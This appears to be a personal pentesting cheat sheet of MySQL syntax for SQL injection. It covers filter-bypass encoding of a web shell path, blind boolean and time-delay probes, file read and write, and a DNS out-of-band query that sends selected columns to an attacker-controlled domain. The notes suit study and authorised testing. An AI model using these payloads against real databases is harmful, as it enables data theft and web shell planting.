# MySQL Database

## Comment Syntax

1. `#`
	* `#COMMENT HERE` 
2. `-- `
	* `-- COMMENT HERE`
	* Note the required whitespace
3. `/* */`
	* `/*COMMENT HERE*/` 

---

## Version Query Syntax

```sql
SELECT @@version
```

```sql
SELECT version()
```

---

## String Concatenation Syntax

```sql
SELECT CONCAT(username, ':', password) FROM users
```

* Takes a variable number of arguments
* Arguments can be column names from the target table or string literals

---

## Cast an Integer into a Character

```sql
-- CHAR($INTEGER)
```

```sql
SELECT path FROM paths WHERE path = CONCAT(CHAR(47),'var',CHAR(47),'www',CHAR(47),'html',CHAR(47),'shell',CHAR(46),'php') -- /var/www/html/shell.php
```

* Especially helpful for bypassing tricky input restrictions on file paths (i.e., no `/`, `\`, and `.` allowed)


---

## Substring Syntax

```sql
SUBSTRING($STRING, $START_INDEX, $LENGTH)
```

```sql
SELECT COUNT(*) FROM users WHERE SUBSTRING(password,1,1) > 'm'
```
* Indices start at 1

---

## Conditional Syntax

```sql
SELECT IF($CONDITION, $VALUE_IF_TRUE, $VALUE_IF_FALSE)
```

```sql
SELECT IF(COUNT(*) = 1, 1, 0) FROM users WHERE username = 'admin' AND password = 'password123' -- returns 1 if password equals 'password123', 0 otherwise
```

Alternatively,

```sql
SELECT CASE WHEN ($CONDITION) THEN $VALUE_IF_TRUE ELSE $VALUE_IF_FALSE END
```

```sql
SELECT CASE WHEN (COUNT(*) = 1) THEN 1 ELSE 0 END FROM users WHERE username = 'admin' and password = 'password123' -- returns 1 if password equals 'password123', 0 otherwise
```

---

## Time delay syntax

[Reference](https://portswigger.net/web-security/sql-injection/cheat-sheet)

### Unconditionally wait for 10 seconds

```sql
SELECT sleep(10)
```

### Conditionally wait for 10 seconds

```sql
SELECT IF ($CONDITION$, sleep(10), 'a')
```

---

## DNS Lookup Syntax

```sql
LOAD_FILE('\\\\$YOUR_SUBDOMAIN.$YOUR_DOMAIN\\a')
SELECT ... INTO OUTFILE '\\\\$YOUR_SUBDOMAIN.$YOUR_DOMAIN\\a'
```
* Only works on Windows
* Requires stacked queries
* Requires the `FILE` privilege & `@@GLOBAL.secure_file_priv` must be equal to `''` (blank). Read more [here](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv).

---

## DNS Lookup with Data Exfiltration Syntax

```sql
SELECT $COLUMNS_TO_EXFIL INTO OUTFILE '\\\\$YOUR_SUBDOMAIN.$YOUR_DOMAIN\\a'
```
* Only works on Windows
* Requires stacked queries
* Requires the `FILE` privilege & `@@GLOBAL.secure_file_priv` must be equal to `''` (blank). Read more [here](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv).

---

## Get Current Database

```sql
SELECT database();
```

---

## Table enumeration

[[database-enumeration#Querying database tables non-Oracle]]

---

## Table column enumeration

[[database-enumeration#Querying database tables' columns non-Oracle]]

---

## Show Current User's MySQL Privileges

```sql
SHOW GRANTS
```

---

## Read File

```sql
SELECT LOAD_FILE("$FILE_PATH")
```

---

## Write to File

```sql
SELECT "$CONTENT_TO_WRITE" INTO OUTFILE "$OUTFILE_PATH"
```

---

## Interact with test database

[Reference](https://hub.docker.com/r/genschsa/mysql-employees)

On a Linux machine with Docker installed, run the `mysql-employees` Docker container.
* Change `$PASSWORD`

```bash
docker run -d -it --rm \
  --name mysql-employees \
  -p 3306:3306 \
  -e MYSQL_ROOT_PASSWORD=blah \
  -v $PWD/data:/var/lib/mysql \
  genschsa/mysql-employees
```

Get a shell in the container.

```bash
docker exec -it $CONTAINER_ID /bin/bash
```

In the container, connect to the test MySQL database.

```bash
mysql -u root -p
```

Query away!